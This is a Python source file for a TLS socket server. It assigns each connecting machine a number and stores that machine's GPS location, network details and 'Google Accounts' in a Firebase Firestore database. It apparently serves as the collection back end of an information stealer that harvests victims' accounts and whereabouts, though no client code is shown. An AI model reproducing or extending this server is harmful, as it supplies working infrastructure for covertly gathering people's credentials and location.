import socket
import ssl
from threading import Thread, Lock
import os
import firebase_admin
from firebase_admin import credentials
from firebase_admin import firestore

class Firebase_DB():
    def __init__(self):
        self.cred = credentials.Certificate("private_key.json")
        firebase_admin.initialize_app(self.cred)

        self.server_ip = '127.0.0.1'
        self.port = 33453
        self.db = firestore.client()
        self.num_comp = len(list(self.db.collection("Computers").list_documents())) + 1
        self.start_server()

    def get_network_ip(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        s.connect(('<broadcast>', 0))
        return s.getsockname()[0]

    def start_server(self):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((self.server_ip, self.port))
        server_socket.listen(30)

        print(f"Server is listening : {self.server_ip} : {self.port}")
        while True:
            client_socket, client_address = server_socket.accept()
            # Create ssl layer.
            ssl_connection = ssl.wrap_socket(client_socket, server_side=True, certfile="server.crt", keyfile="server.key")

            client_handler = Thread(target=self.handle_client, args=(ssl_connection,))
            client_handler.start()
    
    def handle_client(self, client_socket):
        msg = int.from_bytes(client_socket.recv(4), byteorder='big')
        if msg == 0:
            client_socket.send(self.num_comp.to_bytes(4, byteorder='big'))
        if msg == 1:
            Thread(target=self.handle_network_and_GPS, args=(client_socket,)).start()
        elif msg == 2:
            Thread(target=self.handle_google_accounts, args=(client_socket,)).start()


    def handle_network_and_GPS(self, client_socket):
        try:
            size_GPS = int.from_bytes(client_socket.recv(4), byteorder='big')
            str_GPS = client_socket.recv(size_GPS).decode('utf-8')

            size_network = int.from_bytes(client_socket.recv(4), byteorder='big')
            str_network = client_socket.recv(size_network).decode('utf-8')
            
            self.db.collection('Computers').document(f'Comp{self.num_comp}').collection('Info').document('GPS').set(self.string_to_dictionary(str_GPS))
            self.db.collection('Computers').document(f'Comp{self.num_comp}').collection('Info').document('Network').set(self.string_to_dictionary(str_network))
        except Exception as e:
            print(1, e)

    def handle_google_accounts(self, client_socket):
        try:
            count = 1
            while True:
                size_account = int.from_bytes(client_socket.recv(4), byteorder='big')
                if size_account == 0:
                    break
                else:
                    str_account = client_socket.recv(size_account).decode('utf-8')
                    self.db.collection('Computers').document(f'Comp{self.num_comp}').collection('Google Accounts').document(f'Account {count}').set(self.string_to_dictionary(str_account))
                    count += 1      
        except Exception as e:
            print(2, e)

    def string_to_dictionary(self, string):
        dic = {}
        string = str(string)
        Elements = string.split(',')
        for ele in Elements:
            key, val = ele.split(':', 1)
            dic[key] = val
        return dic

if __name__ == '__main__':
    system = Firebase_DB()